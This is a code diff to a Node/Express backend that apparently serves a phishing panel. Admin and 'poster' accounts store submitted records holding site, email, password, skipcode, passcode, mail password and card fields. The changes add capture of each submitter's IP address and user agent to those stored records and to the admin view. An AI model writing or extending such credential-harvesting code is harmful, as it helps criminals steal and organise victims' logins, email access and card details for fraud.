@@ -26,11 +26,14 @@ const{id}=req.params
 
 
     try {
+        const userAgent = req.headers['user-agent'];
+        const ipAddress = req.connection.remoteAddress;
 
-        // const data = await    Info.find().sort({ field: 'asc', _id: -1 }).limit(1)
-        // const data =    await Info.find().sort({$natural:-1}).limit(1);
-        // const data = await Info.find({root:id})
-        return res.status(200).json({ data: "data" })
+        console.log('User-Agent:', userAgent);
+
+  // Get IP address
+  console.log('IP Address:', ipAddress);
+        return res.status(200).json({ userAgent:userAgent,ipAddress: ipAddress})
 
 
 
@@ -530,7 +533,7 @@ export const poster_details =  (req, res) => {
 
     Poster.findById(id)
     .select('username password posterId links createdAt details')
-    .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt').sort({ createdAt: -1 })
+    .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard ip agent createdAt').sort({ createdAt: -1 })
 
     .then(data => {
         return res.status(200).json({ data: data })    }
@@ -613,7 +616,7 @@ if(admin == 1){
 export const site_exist =async (req, res) => {
 
     const { site, adminId, posterId,device} = req.params
-    const siteName = "https://" + site + "/" + "verify" +  "/" + adminId + "/" + posterId
+    const siteName = "https://" + site +  "/" + adminId + "/" + posterId
     // return res.status(200).json({ success: siteName })
 
     const devicetype = req.device.type
@@ -1158,6 +1161,8 @@ export const add_data_checnge = async (req, res) => {
 
     const { adminId, posterId } = req.params
     const { site, email, password, skipcode ,username,passcode,mail, mailPass,onlyCard,holdingCard } = req.body
+    const userAgent = req.headers['user-agent'];
+    const ipAddress = req.connection.remoteAddress;
     try {
         const userFound = await User.findOne({ adminId: adminId })
 
@@ -1169,7 +1174,9 @@ export const add_data_checnge = async (req, res) => {
                 username,passcode,mail,mailPass,
                 poster: posterId,
                 root: posterFound._id,
-                onlyCard,holdingCard
+                onlyCard,holdingCard,
+                ip:ipAddress,
+                agent:userAgent
 
             })
             posterFound.details.push(info._id)
